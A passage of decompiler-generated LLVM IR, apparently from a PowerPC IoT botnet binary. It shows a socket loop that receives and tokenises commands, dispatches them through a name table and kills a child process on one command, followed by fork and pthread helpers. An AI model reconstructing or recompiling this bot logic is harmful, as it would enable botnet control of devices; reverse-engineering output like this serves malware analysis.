  %v1_10012ab4 = add i32 %v2_10012ab086, -4
  store i32 %v1_10012ab4, i32* @r10, align 4
  %v1_10012ad0 = inttoptr i32 %v2_10012ab086 to i32*
  %v2_10012ad0 = load i32, i32* %v1_10012ad0, align 4
  %v2_10012ad4 = inttoptr i32 %v1_10012ab4 to i32*
  store i32 %v2_10012ad0, i32* %v2_10012ad4, align 4
  %v1_10012a90 = add i32 %v1_10012a9083, 1
  %v3_10012ae8 = load i32, i32* @global_var_1004515c.26, align 4
  %v2_10012af0 = icmp ult i32 %v1_10012a90, %v3_10012ae8
  %v1_10012aa0 = mul i32 %v1_10012a90, 4
  %v3_10012aac = load i32, i32* @global_var_100451ac.27, align 4
  %v2_10012ab0 = add i32 %v3_10012aac, %v1_10012aa0
  br i1 %v2_10012af0, label %dec_label_pc_10012a9c, label %dec_label_pc_10012af8

dec_label_pc_10012af8:                            ; preds = %dec_label_pc_10012a9c, %dec_label_pc_10012ae4.preheader
  %v2_10012ab0.lcssa = phi i32 [ %v2_10012ab082, %dec_label_pc_10012ae4.preheader ], [ %v2_10012ab0, %dec_label_pc_10012a9c ]
  %v1_10012b10 = add i32 %v2_10012ab0.lcssa, -4
  %v2_10012b18 = inttoptr i32 %v1_10012b10 to i32*
  store i32 0, i32* %v2_10012b18, align 4
  %v3_10012b20 = load i32, i32* @global_var_1004515c.26, align 4
  %v1_10012b24 = add i32 %v3_10012b20, -1
  store i32 %v1_10012b24, i32* @global_var_1004515c.26, align 4
  %v1_10012b38 = mul i32 %v1_10012b24, 4
  %v1_10012b3c = add i32 %v1_10012b38, 4
  store i32 %v1_10012b3c, i32* @r3, align 4
  store i32 268512072, i32* @lr, align 4
  %v0_10012b44 = call i32 @malloc()
  %v3_10012ba024 = load i32, i32* @global_var_1004515c.26, align 4
  %v2_10012ba825 = icmp eq i32 %v3_10012ba024, 0
  br i1 %v2_10012ba825, label %dec_label_pc_10012bb0, label %dec_label_pc_10012b5c

dec_label_pc_10012b5c:                            ; preds = %dec_label_pc_10012af8, %dec_label_pc_10012b5c
  %storemerge2027 = phi i32 [ %v1_10012b94, %dec_label_pc_10012b5c ], [ 0, %dec_label_pc_10012af8 ]
  %v1_10012b60 = mul i32 %storemerge2027, 4
  %v2_10012b6c = add i32 %v1_10012b60, %v0_10012b44
  store i32 %v2_10012b6c, i32* @r10, align 4
  %v3_10012b80 = load i32, i32* @global_var_100451ac.27, align 4
  %v2_10012b84 = add i32 %v3_10012b80, %v1_10012b60
  %v1_10012b88 = inttoptr i32 %v2_10012b84 to i32*
  %v2_10012b88 = load i32, i32* %v1_10012b88, align 4
  %v2_10012b8c = inttoptr i32 %v2_10012b6c to i32*
  store i32 %v2_10012b88, i32* %v2_10012b8c, align 4
  %v1_10012b94 = add i32 %storemerge2027, 1
  %v3_10012ba0 = load i32, i32* @global_var_1004515c.26, align 4
  %v2_10012ba8 = icmp ult i32 %v1_10012b94, %v3_10012ba0
  br i1 %v2_10012ba8, label %dec_label_pc_10012b5c, label %dec_label_pc_10012b9c.dec_label_pc_10012bb0_crit_edge

dec_label_pc_10012b9c.dec_label_pc_10012bb0_crit_edge: ; preds = %dec_label_pc_10012b5c
  br label %dec_label_pc_10012bb0

dec_label_pc_10012bb0:                            ; preds = %dec_label_pc_10012af8, %dec_label_pc_10012b9c.dec_label_pc_10012bb0_crit_edge
  %v3_10012bb4 = load i32, i32* @global_var_100451ac.27, align 4
  store i32 %v3_10012bb4, i32* @r3, align 4
  store i32 268512192, i32* @lr, align 4
  %v0_10012bbc = call i32 @free()
  store i32 %v0_10012b44, i32* @global_var_100451ac.27, align 4
  br label %dec_label_pc_10012bcc

dec_label_pc_10012bcc:                            ; preds = %dec_label_pc_10012a54, %dec_label_pc_10012bb0
  %v3_10012bdc = load i32, i32* @global_var_1004515c.26, align 4
  %v2_10012be4 = icmp ult i32 %.pre, %v3_10012bdc
  br i1 %v2_10012be4, label %dec_label_pc_10012a54, label %dec_label_pc_10012bec

dec_label_pc_10012bec:                            ; preds = %dec_label_pc_10012bd8.preheader, %dec_label_pc_10012bcc
  %v3_10012bf0 = load i32, i32* @global_var_1004517c.23, align 4
  %v1_10012bf4 = udiv i32 %v3_10012bf0, 32
  %v1_10012bf8 = mul nuw nsw i32 %v1_10012bf4, 4
  %v1_10012c04 = add i32 %v1_10012bf8, %v2_100129c8
  %v1_10012c08 = inttoptr i32 %v1_10012c04 to i32*
  %v2_10012c08 = load i32, i32* %v1_10012c08, align 4
  %v1_10012c14 = urem i32 %v3_10012bf0, 32
  %v3_10012c18 = sub i32 0, %v3_10012bf0
  %v4_10012c18 = urem i32 %v3_10012c18, 32
  %v5_10012c18 = shl i32 %v2_10012c08, %v4_10012c18
  %v6_10012c18 = xor i32 %v4_10012c18, 31
  %v7_10012c18 = lshr i32 %v2_10012c08, %v6_10012c18
  %v8_10012c18 = udiv i32 %v7_10012c18, 2
  %v9_10012c18 = or i32 %v8_10012c18, %v5_10012c18
  %v12_10012c18 = lshr i32 -1, %v1_10012c14
  %tmp = icmp slt i32 %v2_10012c08, 0
  %v15_10012c1821 = zext i1 %tmp to i32
  %v16_10012c18 = xor i32 %v12_10012c18, 1
  %v17_10012c18 = and i32 %v15_10012c1821, %v16_10012c18
  %v14_10012c18 = urem i32 %v12_10012c18, 2
  %v14_10012c18.masked = and i32 %v14_10012c18, %v9_10012c18
  %v1_10012c20 = or i32 %v14_10012c18.masked, %v17_10012c18
  %v3_10012c24 = icmp eq i32 %v1_10012c20, 0
  br i1 %v3_10012c24, label %dec_label_pc_1001296c, label %dec_label_pc_10012c2c

dec_label_pc_10012c2c:                            ; preds = %dec_label_pc_10012bec
  store i32 268512332, i32* @lr, align 4
  %v4_10012c48 = call i32 @recv(i32 %v3_10012bf0, i32 %v2_10012c34, i32 4096, i32 0)
  store i32 %v4_10012c48, i32* %stack_var_-6616, align 4
  %tmp76 = icmp slt i32 %v4_10012c48, 1
  br i1 %tmp76, label %dec_label_pc_10012910, label %dec_label_pc_10012c60

dec_label_pc_10012c60:                            ; preds = %dec_label_pc_10012c2c
  %v3_10012c70 = add i32 %v2_10012c68, %v4_10012c48
  %v4_10012c70 = inttoptr i32 %v3_10012c70 to i8*
  store i8 0, i8* %v4_10012c70, align 1
  store i32 ptrtoint (i32* @global_var_1002e09c.957 to i32), i32* @r4, align 4
  store i32 268512392, i32* @lr, align 4
  %v4_10012c84 = call i32 @__GI_strtok(i32 %v2_10012c34, i32 ptrtoint (i32* @global_var_1002e09c.957 to i32), i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  %v3_10012f3445 = icmp eq i32 %v4_10012c84, 0
  br i1 %v3_10012f3445, label %dec_label_pc_1001296c, label %dec_label_pc_10012f3c

dec_label_pc_10012c94:                            ; preds = %dec_label_pc_10012f3c
  store i32 268512412, i32* @lr, align 4
  %v4_10012c98 = call i32 @filter(i32 %storemerge47.in, i32 %storemerge47.in)
  %v2_10012ca0 = load i8, i8* %storemerge47, align 1
  %v3_10012ca8 = icmp eq i8 %v2_10012ca0, 58
  br i1 %v3_10012ca8, label %dec_label_pc_10012cc8.preheader, label %dec_label_pc_10012d54

dec_label_pc_10012cc8.preheader:                  ; preds = %dec_label_pc_10012c94
  store i32 0, i32* %stack_var_-6616, align 4
  store i32 %storemerge47.in, i32* @r3, align 4
  %v0_10012cd032 = call i32 @__GI_strlen()
  %v2_10012cd834 = icmp eq i32 %v0_10012cd032, 0
  br i1 %v2_10012cd834, label %dec_label_pc_10012d00, label %dec_label_pc_10012ce0

dec_label_pc_10012cbc:                            ; preds = %dec_label_pc_10012ce0
  %v1_10012cc0 = add i32 %v3_10012ce0, 1
  store i32 %v1_10012cc0, i32* %stack_var_-6616, align 4
  store i32 %storemerge47.in, i32* @r3, align 4
  %v0_10012cd0 = call i32 @__GI_strlen()
  %v2_10012cd8 = icmp ult i32 %v1_10012cc0, %v0_10012cd0
  br i1 %v2_10012cd8, label %dec_label_pc_10012ce0, label %dec_label_pc_10012d00

dec_label_pc_10012ce0:                            ; preds = %dec_label_pc_10012cc8.preheader, %dec_label_pc_10012cbc
  %v3_10012ce0 = load i32, i32* %stack_var_-6616, align 4
  %v2_10012cec = add i32 %v3_10012ce0, %storemerge47.in
  %v1_10012cf0 = inttoptr i32 %v2_10012cec to i8*
  %v2_10012cf0 = load i8, i8* %v1_10012cf0, align 1
  %v3_10012cf8 = icmp eq i8 %v2_10012cf0, 32
  br i1 %v3_10012cf8, label %dec_label_pc_10012d00, label %dec_label_pc_10012cbc

dec_label_pc_10012d00:                            ; preds = %dec_label_pc_10012cc8.preheader, %dec_label_pc_10012cbc, %dec_label_pc_10012ce0
  %v3_10012d00 = load i32, i32* %stack_var_-6616, align 4
  %v2_10012d0c = add i32 %v3_10012d00, %storemerge47.in
  %v3_10012d14 = inttoptr i32 %v2_10012d0c to i8*
  store i8 0, i8* %v3_10012d14, align 1
  %v1_10012d1c = add i32 %storemerge47.in, 1
  %v2_10012d2c = inttoptr i32 %v1_10012d1c to i8*
  %v3_10012d2c = call i32 @strcpy(i32 %v2_10012d20, i8* %v2_10012d2c)
  %v3_10012d30 = load i32, i32* %stack_var_-6616, align 4
  %v2_10012d3c = add i32 %v3_10012d30, %storemerge47.in
  %v1_10012d40 = add i32 %v2_10012d3c, 1
  %v3_10012d4c = inttoptr i32 %v1_10012d40 to i8*
  %v4_10012d4c = call i32 @strcpy(i32 %storemerge47.in, i8* %v3_10012d4c)
  br label %dec_label_pc_10012d78.preheader

dec_label_pc_10012d54:                            ; preds = %dec_label_pc_10012c94
  store i32 10752, i32* %stack_var_-5156, align 4
  br label %dec_label_pc_10012d78.preheader

dec_label_pc_10012d78.preheader:                  ; preds = %dec_label_pc_10012d00, %dec_label_pc_10012d54
  store i32 0, i32* %stack_var_-6616, align 4
  store i32 %storemerge47.in, i32* @r3, align 4
  %v0_10012d8037 = call i32 @__GI_strlen()
  %v2_10012d8839 = icmp eq i32 %v0_10012d8037, 0
  br i1 %v2_10012d8839, label %dec_label_pc_10012db0, label %dec_label_pc_10012d90

dec_label_pc_10012d6c:                            ; preds = %dec_label_pc_10012d90
  %v1_10012d70 = add i32 %v3_10012d90, 1
  store i32 %v1_10012d70, i32* %stack_var_-6616, align 4
  store i32 %storemerge47.in, i32* @r3, align 4
  %v0_10012d80 = call i32 @__GI_strlen()
  %v2_10012d88 = icmp ult i32 %v1_10012d70, %v0_10012d80
  br i1 %v2_10012d88, label %dec_label_pc_10012d90, label %dec_label_pc_10012db0

dec_label_pc_10012d90:                            ; preds = %dec_label_pc_10012d78.preheader, %dec_label_pc_10012d6c
  %v3_10012d90 = load i32, i32* %stack_var_-6616, align 4
  %v2_10012d9c = add i32 %v3_10012d90, %storemerge47.in
  %v1_10012da0 = inttoptr i32 %v2_10012d9c to i8*
  %v2_10012da0 = load i8, i8* %v1_10012da0, align 1
  %v3_10012da8 = icmp eq i8 %v2_10012da0, 32
  br i1 %v3_10012da8, label %dec_label_pc_10012db0, label %dec_label_pc_10012d6c

dec_label_pc_10012db0:                            ; preds = %dec_label_pc_10012d78.preheader, %dec_label_pc_10012d6c, %dec_label_pc_10012d90
  %v3_10012db0 = load i32, i32* %stack_var_-6616, align 4
  %v2_10012dbc = add i32 %v3_10012db0, %storemerge47.in
  %v3_10012dc4 = inttoptr i32 %v2_10012dbc to i8*
  store i8 0, i8* %v3_10012dc4, align 1
  %v4_10012dd4 = call i32 @strcpy(i32 %v2_10012dc8, i8* %storemerge47)
  %v3_10012dd8 = load i32, i32* %stack_var_-6616, align 4
  %v2_10012de4 = add i32 %v3_10012dd8, %storemerge47.in
  %v1_10012de8 = add i32 %v2_10012de4, 1
  %v3_10012df4 = inttoptr i32 %v1_10012de8 to i8*
  %v4_10012df4 = call i32 @strcpy(i32 %storemerge47.in, i8* %v3_10012df4)
  store i32 0, i32* %stack_var_-6616, align 4
  %v2_10012e9489 = load i32, i32* bitcast ([4 x i8]** @global_var_1004086c.961 to i32*), align 4
  %v3_10012e9892 = icmp eq i32 %v2_10012e9489, 0
  br i1 %v3_10012e9892, label %dec_label_pc_10012ea0, label %dec_label_pc_10012e04

dec_label_pc_10012e04:                            ; preds = %dec_label_pc_10012db0, %dec_label_pc_10012e04
  %v1_10012e9495 = phi i32* [ %v1_10012e94, %dec_label_pc_10012e04 ], [ bitcast ([4 x i8]** @global_var_1004086c.961 to i32*), %dec_label_pc_10012db0 ]
  %v2_10012e18 = load i32, i32* %v1_10012e9495, align 4
  store i32 %v2_10012e18, i32* @r3, align 4
  store i32 %v2_10012dc8, i32* @r4, align 4
  %v2_10012e28 = call i32 @__GI_strcasecmp(i32 %v2_10012e18, i32 %v2_10012dc8)
  %v3_10012e38 = load i32, i32* %stack_var_-6616, align 4
  %v1_10012e44 = mul i32 %v3_10012e38, 8
  %v1_10012e4c = add i32 %v1_10012e44, add (i32 ptrtoint ([4 x i8]** @global_var_1004086c.961 to i32), i32 4)
  %v1_10012e50 = inttoptr i32 %v1_10012e4c to i32*
  %v2_10012e50 = load i32, i32* %v1_10012e50, align 4
  call void @__pseudo_call(i32 %v2_10012e50)
  %v3_10012e74 = load i32, i32* %stack_var_-6616, align 4
  %v1_10012e78 = add i32 %v3_10012e74, 1
  store i32 %v1_10012e78, i32* %stack_var_-6616, align 4
  %v1_10012e8c = mul i32 %v1_10012e78, 8
  %v2_10012e90 = add i32 %v1_10012e8c, ptrtoint ([4 x i8]** @global_var_1004086c.961 to i32)
  %v1_10012e94 = inttoptr i32 %v2_10012e90 to i32*
  %v2_10012e94 = load i32, i32* %v1_10012e94, align 4
  %v3_10012e98 = icmp eq i32 %v2_10012e94, 0
  br i1 %v3_10012e98, label %dec_label_pc_10012ea0, label %dec_label_pc_10012e04

dec_label_pc_10012ea0:                            ; preds = %dec_label_pc_10012e04, %dec_label_pc_10012db0
  store i32 %v2_10012dc8, i32* @r3, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1002e0a0.962 to i32), i32* @r4, align 4
  %v3_10012eb0 = call i32 @__GI_strcasecmp(i32 %v2_10012dc8, i32 ptrtoint ([6 x i8]* @global_var_1002e0a0.962 to i32))
  %v3_10012eb8 = icmp eq i32 %v3_10012eb0, 0
  br i1 %v3_10012eb8, label %dec_label_pc_10012ec0, label %dec_label_pc_10012f18

dec_label_pc_10012ec0:                            ; preds = %dec_label_pc_10012ea0
  %v3_10012ec4 = load i32, i32* @global_var_10045148.571, align 4
  %v3_10012ec8 = icmp eq i32 %v3_10012ec4, 0
  br i1 %v3_10012ec8, label %dec_label_pc_10012efc, label %dec_label_pc_10012ed0

dec_label_pc_10012ed0:                            ; preds = %dec_label_pc_10012ec0
  store i32 268512996, i32* @lr, align 4
  %v2_10012ee0 = call i32 @kill(i32 %v3_10012ec4, i32 9)
  %v3_10012ee8 = icmp eq i32 %v2_10012ee0, 0
  br i1 %v3_10012ee8, label %dec_label_pc_10012ef0, label %dec_label_pc_10012efc

dec_label_pc_10012ef0:                            ; preds = %dec_label_pc_10012ed0
  store i32 0, i32* @global_var_10045148.571, align 4
  br label %dec_label_pc_10012efc

dec_label_pc_10012efc:                            ; preds = %dec_label_pc_10012ed0, %dec_label_pc_10012ec0, %dec_label_pc_10012ef0
  %v3_10012f00 = load i32, i32* @global_var_1004517c.23, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10012f0c.963 to i32), i32* @lr, align 4
  %v1_10012f08 = call i32 @close(i32 %v3_10012f00)
  store i32 268513044, i32* @lr, align 4
  %v1_10012f10 = call i32 @sleep(i32 5)
  br label %dec_label_pc_10012910

dec_label_pc_10012f18:                            ; preds = %dec_label_pc_10012ea0
  store i32 ptrtoint (i32* @global_var_1002e09c.957 to i32), i32* @r4, align 4
  store i32 268513064, i32* @lr, align 4
  %v4_10012f24 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1002e09c.957 to i32), i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  %v3_10012f34 = icmp eq i32 %v4_10012f24, 0
  br i1 %v3_10012f34, label %dec_label_pc_1001296c, label %dec_label_pc_10012f3c

dec_label_pc_10012f3c:                            ; preds = %dec_label_pc_10012c60, %dec_label_pc_10012f18
  %storemerge47.in = phi i32 [ %v4_10012f24, %dec_label_pc_10012f18 ], [ %v4_10012c84, %dec_label_pc_10012c60 ]
  %storemerge47 = inttoptr i32 %storemerge47.in to i8*
  %v3_10012f40 = load i8, i8* %storemerge47, align 1
  %v3_10012f48 = icmp eq i8 %v3_10012f40, 0
  br i1 %v3_10012f48, label %dec_label_pc_1001296c, label %dec_label_pc_10012c94

dec_label_pc_10012f54:                            ; preds = %entry
  ret i32 0

; uselistorder directives
  uselistorder i8* %storemerge47, { 2, 1, 0 }
  uselistorder i32 %storemerge47.in, { 15, 14, 13, 7, 10, 5, 4, 9, 3, 8, 6, 12, 2, 1, 0, 11 }
  uselistorder i32* %v1_10012e94, { 1, 0 }
  uselistorder i32 %v4_10012c18, { 1, 0 }
  uselistorder i32 %v2_10012c08, { 0, 2, 1 }
  uselistorder i32 %v3_10012bf0, { 2, 3, 1, 0 }
  uselistorder i32 %v1_10012b94, { 1, 0 }
  uselistorder i32 %v1_10012b60, { 1, 0 }
  uselistorder i32 %storemerge2027, { 1, 0 }
  uselistorder i32 %v0_10012b44, { 1, 0 }
  uselistorder i32 %v1_10012a90, { 0, 2, 1 }
  uselistorder i32 %v2_10012ab086, { 1, 0 }
  uselistorder i32 %.pre, { 2, 4, 0, 3, 1 }
  uselistorder i32 %storemerge1331, { 1, 0 }
  uselistorder i32 %v3_100129b4, { 1, 0 }
  uselistorder i32 %storemerge1223, { 1, 0 }
  uselistorder i32 %v2_10012dc8, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_1001296c, { 1, 0 }
  uselistorder i32 %v1_10012830, { 1, 0 }
  uselistorder i32 %v2_100127f4, { 1, 0 }
  uselistorder i32 %storemerge1151, { 1, 0 }
  uselistorder i8*** %stack_var_-20, { 2, 0, 1 }
  uselistorder i32* %stack_var_-6616, { 5, 6, 7, 0, 8, 9, 10, 4, 1, 11, 12, 13, 3, 2, 14, 15 }
  uselistorder i32 (i32)* @sleep, { 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @close, { 25, 24, 23, 22, 21, 20, 19, 18, 6, 5, 4, 3, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 2, 1, 0 }
  uselistorder i32 ptrtoint ([4 x i8]** @global_var_1004086c.961 to i32), { 1, 0 }
  uselistorder [4 x i8]** @global_var_1004086c.961, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__GI_strtok, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1002e09c.957 to i32), { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32, i32)* @recv, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* @global_var_100451ac.27, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* @global_var_1004515c.26, { 6, 7, 2, 8, 9, 10, 0, 1, 11, 3, 12, 4, 13, 14, 15, 5, 16, 17 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 7, 6, 4, 3, 2, 1, 5, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @Send, { 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 33, 32, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 2, 1, 0, 38, 37, 36, 35, 34, 4, 3, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5 }
  uselistorder i32 (i32)* @getBuild, { 1, 0 }
  uselistorder i32 (i32)* @randstring, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @realrand, { 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @srand, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_time, { 63, 62, 61, 0, 60, 59, 58, 57, 56, 1, 55, 54, 2, 53, 52, 3, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 8, 7, 6, 4, 5, 16, 15, 14, 13, 12, 11, 10, 9 }
  uselistorder i32 %argc, { 1, 0 }
  uselistorder label %dec_label_pc_10012f3c, { 1, 0 }
  uselistorder label %dec_label_pc_10012efc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10012e04, { 1, 0 }
  uselistorder label %dec_label_pc_10012db0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10012d90, { 1, 0 }
  uselistorder label %dec_label_pc_10012d78.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10012d00, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10012ce0, { 1, 0 }
  uselistorder label %dec_label_pc_10012bec, { 1, 0 }
  uselistorder label %dec_label_pc_10012bcc, { 1, 0 }
  uselistorder label %dec_label_pc_10012bb0, { 1, 0 }
  uselistorder label %dec_label_pc_10012b5c, { 1, 0 }
  uselistorder label %dec_label_pc_10012a9c, { 1, 0 }
  uselistorder label %dec_label_pc_10012a54, { 1, 0 }
  uselistorder label %dec_label_pc_10012980, { 1, 0 }
  uselistorder label %dec_label_pc_1001296c, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_100127e0, { 1, 0 }
}

define i32 @__h_errno_location(i32 %arg1) local_unnamed_addr {
entry:
  %v0_10012f70 = load i32, i32* @r2, align 4
  %v1_10012f70 = add i32 %v0_10012f70, 76
  %v2_10012f70 = inttoptr i32 %v1_10012f70 to i32*
  %v3_10012f70 = load i32, i32* %v2_10012f70, align 4
  ret i32 %v3_10012f70
}

define i32 @__errno_location() local_unnamed_addr {
entry:
  %v0_10012f78 = load i32, i32* @r2, align 4
  %v1_10012f78 = add i32 %v0_10012f78, 68
  %v2_10012f78 = inttoptr i32 %v1_10012f78 to i32*
  %v3_10012f78 = load i32, i32* %v2_10012f78, align 4
  ret i32 %v3_10012f78
}

define i32 @pthread_insert_list(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_10012f80 = icmp eq i32 %arg1, 0
  %v0_10012f84 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10012f80, i32 %v0_10012f84)
  %v3_10012f88 = icmp eq i32 %arg3, 0
  br i1 %v3_10012f88, label %dec_label_pc_10012fa4, label %dec_label_pc_10012f98.preheader

dec_label_pc_10012f98.preheader:                  ; preds = %entry
  call void @llvm.trap()
  unreachable

dec_label_pc_10012fa4:                            ; preds = %entry
  store i32 %arg1, i32* %arg2, align 4
  call void @llvm.trap()
  unreachable
}

define i32 @pthread_call_handlers() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %storemerge1 = load i32, i32* @r3, align 4
  store i32 %storemerge1, i32* %r31.global-to-local, align 4
  %v3_10012fe04 = icmp eq i32 %storemerge1, 0
  br i1 %v3_10012fe04, label %dec_label_pc_10012fe8, label %dec_label_pc_10012fd0

dec_label_pc_10012fd0:                            ; preds = %entry, %dec_label_pc_10012fd0
  %v0_10012fd0 = phi i32 [ %storemerge, %dec_label_pc_10012fd0 ], [ %storemerge1, %entry ]
  %v1_10012fd0 = inttoptr i32 %v0_10012fd0 to i32*
  %v2_10012fd0 = load i32, i32* %v1_10012fd0, align 4
  call void @__pseudo_call(i32 %v2_10012fd0)
  %v0_10012fdc = load i32, i32* %r31.global-to-local, align 4
  %v1_10012fdc = add i32 %v0_10012fdc, 4
  %v2_10012fdc = inttoptr i32 %v1_10012fdc to i32*
  %storemerge = load i32, i32* %v2_10012fdc, align 4
  store i32 %storemerge, i32* %r31.global-to-local, align 4
  %v3_10012fe0 = icmp eq i32 %storemerge, 0
  br i1 %v3_10012fe0, label %dec_label_pc_10012fe0.dec_label_pc_10012fe8_crit_edge, label %dec_label_pc_10012fd0

dec_label_pc_10012fe0.dec_label_pc_10012fe8_crit_edge: ; preds = %dec_label_pc_10012fd0
  %v0_10012ff8.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10012fe8

dec_label_pc_10012fe8:                            ; preds = %dec_label_pc_10012fe0.dec_label_pc_10012fe8_crit_edge, %entry
  %v0_10012ff8 = phi i32 [ %v0_10012ff8.pre, %dec_label_pc_10012fe0.dec_label_pc_10012fe8_crit_edge ], [ 0, %entry ]
  ret i32 %v0_10012ff8

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32* %r31.global-to-local, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10012fd0, { 1, 0 }
}

define i32 @fork() local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i32, align 4
  %v0_10013004 = call i32 @__asm_mfcr()
  store i32 ptrtoint (i32* @global_var_100496b4.964 to i32), i32* @r27, align 4
  store i32 268513316, i32* @lr, align 4
  %v1_10013020 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_100496b4.964 to i32))
  %v3_10013028 = load i32, i32* @global_var_100451b0.965, align 4
  store i32 %v3_10013028, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10013040.968 to i32), i32* @lr, align 4
  %v0_1001303c = call i32 @pthread_call_handlers()
  store i32 268513348, i32* @lr, align 4
  %v1_10013040 = call i32 @__pthread_once_fork_prepare(i32 %v0_1001303c)
  store i32 ptrtoint (i32* @global_var_1004ee20.969 to i32), i32* @r28, align 4
  store i32 268513364, i32* @lr, align 4
  %v1_10013050 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1004ee20.969 to i32))
  store i32 ptrtoint (i32* @global_var_1004da14.970 to i32), i32* @r30, align 4
  store i32 ptrtoint (i32* @global_var_10013064.971 to i32), i32* @lr, align 4
  %v1_10013060 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1004da14.970 to i32))
  store i32 268513384, i32* @lr, align 4
  %v1_10013064 = call i32 @__libc_fork(i32 %v1_10013060)
  store i32 %v1_10013064, i32* @r26, align 4
  %v3_1001306c = icmp eq i32 %v1_10013064, 0
  store i32 268527476, i32* @r9, align 4
  store i1 false, i1* @cr4_eq, align 1
  %v0_10013078 = load i32, i32* @r30, align 4
  store i32 %v0_10013078, i32* @r3, align 4
  br i1 %v3_1001306c, label %dec_label_pc_100130b4, label %dec_label_pc_10013100

dec_label_pc_100130b4:                            ; preds = %entry
  %v2_10013080 = ptrtoint i32* %stack_var_-56 to i32
  %v2_10013090 = call i32 @pthread_mutexattr_init(i32* nonnull %stack_var_-56)
  %v3_1001309c = call i32 @__pthread_mutexattr_setkind_np(i32* nonnull %stack_var_-56, i32 0)
  %v0_100130a0 = load i32, i32* @r30, align 4
  %v3_100130a8 = call i32 @pthread_mutex_init(i32 %v0_100130a0, i32* nonnull %stack_var_-56)
  %v1_100130b0 = call i32 @pthread_mutexattr_destroy(i32 %v2_10013080)
  %v0_100130b4 = load i32, i32* @r28, align 4
  %v3_100130bc = call i32 @pthread_mutex_init(i32 %v0_100130b4, i32* null)
  %v0_100130c4 = load i1, i1* @cr4_eq, align 1
  br i1 %v0_100130c4, label %dec_label_pc_100130ec, label %dec_label_pc_100130c8

dec_label_pc_100130c8:                            ; preds = %dec_label_pc_100130b4
  %v2_100130c8 = call i32 @pthread_mutexattr_init(i32* nonnull %stack_var_-56)
  %v3_100130d4 = call i32 @__pthread_mutexattr_setkind_np(i32* nonnull %stack_var_-56, i32 0)
  %v0_100130d8 = load i32, i32* @r27, align 4
  %v3_100130e0 = call i32 @pthread_mutex_init(i32 %v0_100130d8, i32* nonnull %stack_var_-56)
  %v1_100130e8 = call i32 @pthread_mutexattr_destroy(i32 %v2_10013080)
  br label %dec_label_pc_100130ec

dec_label_pc_100130ec:                            ; preds = %dec_label_pc_100130b4, %dec_label_pc_100130c8
  store i32 ptrtoint (i32* @global_var_100130f0.973 to i32), i32* @lr, align 4
  %v0_100130ec = call i32 @__pthread_reset_main_thread()
  store i32 ptrtoint (i32* @global_var_100130f4.974 to i32), i32* @lr, align 4
  %v1_100130f0 = call i32 @__fresetlockfiles(i32 %v0_100130ec)
  store i32 268513528, i32* @lr, align 4
  %v1_100130f4 = call i32 @__pthread_once_fork_child(i32 %v1_100130f0)
  br label %dec_label_pc_1001311c

dec_label_pc_10013100:                            ; preds = %entry
